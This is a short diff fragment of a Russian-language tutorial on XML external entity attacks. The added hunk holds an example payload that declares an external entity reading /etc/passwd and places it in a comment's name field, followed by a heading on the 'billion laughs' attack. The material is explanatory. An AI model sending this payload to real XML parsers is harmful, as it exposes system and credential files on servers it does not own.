@@ -8,6 +8,18 @@
 
 * SYSTEM — ключевое слово, которое говорит парсеру: "Эта сущность берется извне (файл или URL)"
 
+ПРИМЕР РЕАЛЬНОЙ АТАКИ:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <name>&secret;</name>
+  <author>Barry Clad</author>
+  <com>...</com>
+</comment>
+
+
 
 --- Атака миллиард смеха ---
 
